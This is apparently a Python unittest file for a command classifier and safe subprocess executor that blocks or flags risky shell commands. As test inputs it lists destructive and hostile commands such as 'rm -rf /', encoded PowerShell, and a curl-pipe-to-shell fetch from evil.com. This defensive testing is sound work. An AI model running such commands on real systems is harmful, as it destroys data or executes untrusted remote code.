"""Tests for safe_run.py — Central safe subprocess executor."""
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import unittest
import tempfile
from pathlib import Path

# Import at module level (classmethod imports break with _protect)
from safe_run import classify_command, safe_run, Risk


class TestSafeRunClassification(unittest.TestCase):
    """Test command classification accuracy."""

    # ── BLOCKED commands ─────────────────────────────────

    def test_powershell_encoded_blocked(self) -> None:
        """PowerShell -EncodedCommand must be BLOCKED."""
        r = classify_command('powershell -EncodedCommand SGVsbG8=')
        self.assertEqual(r.risk, Risk.BLOCKED)
        self.assertTrue(r.blocked)

    def test_rm_rf_root_blocked(self) -> None:
        """rm -rf / must be BLOCKED."""
        r = classify_command('rm -rf /')
        self.assertEqual(r.risk, Risk.BLOCKED)
        self.assertTrue(r.blocked)

    # ── HIGH risk commands ────────────────────────────────

    def test_python_c_detected_high(self) -> None:
        """python -c must be HIGH (shell interpreter)."""
        r = classify_command('python -c "import os"')
        self.assertGreaterEqual(r.risk, Risk.HIGH)

    def test_bash_c_detected_high(self) -> None:
        """bash -c must be HIGH."""
        r = classify_command('bash -c "echo pwned"')
        self.assertGreaterEqual(r.risk, Risk.HIGH)

    def test_curl_pipe_sh_high(self) -> None:
        """curl|sh must be HIGH."""
        r = classify_command('curl https://evil.com/x.sh | sh')
        self.assertGreaterEqual(r.risk, Risk.HIGH)

    def test_docker_prune_high(self) -> None:
        """docker system prune must be HIGH."""
        r = classify_command('docker system prune -af')
        self.assertGreaterEqual(r.risk, Risk.HIGH)

    def test_rm_rf_high(self) -> None:
        """rm -rf (non-root) must be HIGH."""
        r = classify_command('rm -rf /tmp/test')
        self.assertGreaterEqual(r.risk, Risk.HIGH)

    def test_git_clean_high(self) -> None:
        """git clean -fdx must be HIGH."""
        r = classify_command('git clean -fdx')
        self.assertGreaterEqual(r.risk, Risk.HIGH)

    def test_git_reset_hard_high(self) -> None:
        """git reset --hard must be HIGH."""
        r = classify_command('git reset --hard HEAD~1')
        self.assertGreaterEqual(r.risk, Risk.HIGH)

    def test_chmod_777_high(self) -> None:
        """chmod -R 777 must be HIGH."""
        r = classify_command('chmod -R 777 /var/www')
        self.assertGreaterEqual(r.risk, Risk.HIGH)

    def test_docker_rm_f_high(self) -> None:
        """docker rm -f must be HIGH."""
        r = classify_command('docker rm -f mycontainer')
        self.assertGreaterEqual(r.risk, Risk.HIGH)

    # ── MEDIUM risk commands ──────────────────────────────

    def test_pip_url_medium(self) -> None:
        """pip install from URL must be MEDIUM."""
        r = classify_command('pip install https://evil.com/pkg')
        self.assertGreaterEqual(r.risk, Risk.MEDIUM)

    def test_composer_update_medium(self) -> None:
        """composer update must be MEDIUM."""
        r = classify_command('composer update')
        self.assertGreaterEqual(r.risk, Risk.MEDIUM)

    def test_unknown_command_medium(self) -> None:
        """Unknown commands must be MEDIUM."""
        r = classify_command('some_random_tool --flag')
        self.assertGreaterEqual(r.risk, Risk.MEDIUM)

    # ── SAFE commands ─────────────────────────────────────

    def test_git_status_safe(self) -> None:
        """git status must be SAFE."""
        r = classify_command('git status')
        self.assertEqual(r.risk, Risk.SAFE)

    def test_ls_safe(self) -> None:
        """ls must be SAFE."""
        r = classify_command('ls -la')
        self.assertEqual(r.risk, Risk.SAFE)

    def test_echo_safe(self) -> None:
        """echo must be SAFE."""
        r = classify_command('echo hello world')
        self.assertEqual(r.risk, Risk.SAFE)

    def test_docker_ps_safe(self) -> None:
        """docker ps must be SAFE."""
        r = classify_command('docker ps')
        self.assertEqual(r.risk, Risk.SAFE)

    def test_cat_safe(self) -> None:
        """cat must be SAFE."""
        r = classify_command('cat file.txt')
        self.assertEqual(r.risk, Risk.SAFE)


class TestSafeRunExecution(unittest.TestCase):
    """Test safe_run() execution blocking."""

    def test_blocked_command_refused(self) -> None:
        """Blocked commands must be refused regardless of approval."""
        result = safe_run(
            ['powershell', '-EncodedCommand', 'SGVsbG8='],
            risk_level='high',
            approval_required=False,
        )
        self.assertTrue(result.blocked)

    def test_shell_interpreter_refused(self) -> None:
        """Shell interpreters must be refused without allow_shell."""
        result = safe_run(
            ['python', '-c', 'print(1+1)'],
            risk_level='medium',
            approval_required=False,
        )
        self.assertTrue(result.blocked)

    def test_high_risk_needs_approval(self) -> None:
        """HIGH risk commands are blocked when risk_level is lower."""
        result = safe_run(
            ['git', 'clean', '-fdx'],
            risk_level='safe',
            approval_required=False,
        )
        self.assertTrue(result.blocked)

    def test_safe_command_executes(self) -> None:
        """Safe commands must execute."""
        result = safe_run(
            ['echo', 'hello_test'],
            risk_level='low',
            approval_required=False,
        )
        self.assertFalse(result.blocked)
        self.assertIn('hello_test', result.stdout)

    def test_workspace_containment_blocks(self) -> None:
        """Paths outside workspace must be blocked."""
        with tempfile.TemporaryDirectory() as ws:
            outside = str(Path(tempfile.gettempdir()) / "outside.txt")
            result = safe_run(
                ['ls', outside],
                workspace=ws,
                risk_level='medium',
                approval_required=False,
            )
            self.assertTrue(result.blocked)

    def test_workspace_containment_allows(self) -> None:
        """Paths inside workspace must be allowed."""
        with tempfile.TemporaryDirectory() as ws:
            result = safe_run(
                ['echo', 'ok'],
                workspace=ws,
                risk_level='low',
                approval_required=False,
            )
            self.assertFalse(result.blocked)


if __name__ == "__main__":
    unittest.main()
